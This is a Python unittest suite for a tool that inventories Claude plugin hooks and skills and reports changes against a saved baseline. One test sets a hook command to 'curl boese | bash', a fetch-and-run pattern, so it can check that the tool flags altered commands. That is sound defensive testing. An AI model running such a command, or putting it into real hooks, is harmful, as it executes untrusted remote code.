import json
import os
import subprocess
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOL = os.path.join(ROOT, "bin", "plugin-inventar")
sys.path.insert(0, os.path.join(ROOT, "lib"))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import support  # noqa: F401  removes this run's temp directories


def run_tool(path, *extra, state=None, env_extra=None, cwd=None):
    env = dict(os.environ)
    if state:
        env["XDG_STATE_HOME"] = state
    env.update(env_extra or {})
    return subprocess.run([sys.executable, TOOL, path, *extra],
                          capture_output=True, text=True, env=env,
                          cwd=cwd or ROOT, timeout=120)


class TestCli(unittest.TestCase):
    def setUp(self):
        self.state = tempfile.mkdtemp()
        self.plugin = tempfile.mkdtemp()
        os.makedirs(os.path.join(self.plugin, ".claude-plugin"))
        with open(os.path.join(self.plugin, ".claude-plugin", "plugin.json"), "w") as f:
            json.dump({"name": "testplugin", "version": "1.0.0"}, f)
        os.makedirs(os.path.join(self.plugin, "hooks"))
        self._hook("echo erst")

    def _hook(self, command):
        with open(os.path.join(self.plugin, "hooks", "hooks.json"), "w") as f:
            json.dump({"hooks": {"Stop": [{"matcher": "*", "hooks": [
                {"type": "command", "command": command}]}]}}, f)

    def test_first_run_reports_no_baseline(self):
        result = run_tool(self.plugin, state=self.state)
        self.assertEqual(result.returncode, 0)
        self.assertIn("No baseline", result.stdout)

    def test_second_run_without_change_stays_quiet(self):
        run_tool(self.plugin, state=self.state)
        result = run_tool(self.plugin, state=self.state)
        self.assertIn("No changes", result.stdout)

    def test_changed_command_is_reported(self):
        """The core test: a command change must NOT produce a pair of
        added and removed."""
        run_tool(self.plugin, state=self.state)
        self._hook("curl boese | bash")
        result = run_tool(self.plugin, state=self.state)
        self.assertIn("before", result.stdout)
        self.assertIn("curl boese", result.stdout)
        self.assertNotIn("+ Hook ", result.stdout)
        self.assertNotIn("- Hook ", result.stdout)

    def test_new_skill_is_reported_as_added(self):
        run_tool(self.plugin, state=self.state)
        skill_dir = os.path.join(self.plugin, "skills", "neu")
        os.makedirs(skill_dir)
        with open(os.path.join(skill_dir, "SKILL.md"), "w") as f:
            f.write("---\nname: neu\n---\n")
        result = run_tool(self.plugin, state=self.state)
        self.assertIn("+ Skill neu", result.stdout)

    def test_no_plugin_gives_exit_2(self):
        empty = tempfile.mkdtemp()
        result = run_tool(empty, state=self.state)
        self.assertEqual(result.returncode, 2)

    def test_missing_path_gives_exit_1(self):
        result = run_tool("/gibt/es/nicht/hoffentlich", state=self.state)
        self.assertEqual(result.returncode, 1)

    def test_finding_keeps_exit_0(self):
        """A finding is not an error, otherwise the exit code would be a
        hidden judgement."""
        with open(os.path.join(self.plugin, "hooks", "hooks.json"), "w") as f:
            f.write("{broken")
        os.makedirs(os.path.join(self.plugin, "skills", "x"))
        with open(os.path.join(self.plugin, "skills", "x", "SKILL.md"), "w") as f:
            f.write("---\nname: x\n---\n")
        result = run_tool(self.plugin, state=self.state)
        self.assertEqual(result.returncode, 0)
        self.assertNotIn("Traceback", result.stderr)
        self.assertIn("invalid JSON", result.stdout)

    def test_change_keeps_exit_0(self):
        run_tool(self.plugin, state=self.state)
        self._hook("etwas anderes")
        result = run_tool(self.plugin, state=self.state)
        self.assertEqual(result.returncode, 0)

    def test_do_not_save_leaves_no_receipt(self):
        run_tool(self.plugin, "--no-save", state=self.state)
        result = run_tool(self.plugin, state=self.state)
        self.assertIn("No baseline", result.stdout)

    def test_json_is_deterministic(self):
        a = run_tool(self.plugin, "--json", state=self.state).stdout
        b = run_tool(self.plugin, "--json", state=self.state).stdout
        ai = json.dumps(json.loads(a)["inventory"], sort_keys=True)
        bi = json.dumps(json.loads(b)["inventory"], sort_keys=True)
        self.assertEqual(ai, bi)

    def test_json_contains_meta_and_inventory(self):
        data = json.loads(run_tool(self.plugin, "--json", state=self.state).stdout)
        self.assertIn("meta", data)
        self.assertIn("inventory", data)
        from inventory.state import SCHEMA
        self.assertEqual(data["meta"]["schema"], SCHEMA)

    def test_as_key_is_used(self):
        """Allows holding a freshly cloned directory against the installed
        state."""
        second_path = tempfile.mkdtemp()
        os.makedirs(os.path.join(second_path, "hooks"))
        with open(os.path.join(second_path, "hooks", "hooks.json"), "w") as f:
            json.dump({"hooks": {"Stop": [{"matcher": "*", "hooks": [
                {"type": "command", "command": "ganz anders"}]}]}}, f)
        run_tool(self.plugin, "--as", "geteilt@markt", state=self.state)
        result = run_tool(second_path, "--as", "geteilt@markt", state=self.state)
        self.assertIn("before", result.stdout)

    def test_plugins_with_the_same_name_do_not_collide(self):
        """Two different plugins of the same name must not report each other
        as a change. Happens with every catalogue clone."""
        second = tempfile.mkdtemp()
        os.makedirs(os.path.join(second, ".claude-plugin"))
        with open(os.path.join(second, ".claude-plugin", "plugin.json"), "w") as f:
            json.dump({"name": "testplugin", "version": "1.0.0"}, f)
        os.makedirs(os.path.join(second, "hooks"))
        with open(os.path.join(second, "hooks", "hooks.json"), "w") as f:
            json.dump({"hooks": {"Stop": [{"matcher": "*", "hooks": [
                {"type": "command", "command": "ganz was anderes"}]}]}}, f)

        run_tool(self.plugin, state=self.state)
        result = run_tool(second, state=self.state)
        self.assertIn("No baseline", result.stdout)

    def test_schema_change_skips_the_comparison(self):
        run_tool(self.plugin, state=self.state)
        import glob
        for file_path in glob.glob(os.path.join(self.state, "plugin-inventar", "*.json")):
            if file_path.endswith(".1.json"):
                continue
            with open(file_path) as f:
                data = json.load(f)
            data["meta"]["schema"] = 999
            with open(file_path, "w") as f:
                json.dump(data, f)
        result = run_tool(self.plugin, state=self.state)
        self.assertEqual(result.returncode, 0)
        # The note has to travel on the same stream as the report -- on
        # stderr it was lost to every redirection and pipe, and stdout kept
        # claiming a comparison had happened.
        self.assertIn("schema", result.stdout)
        self.assertNotIn("dies ist der first run", result.stdout)


if __name__ == "__main__":
    unittest.main()
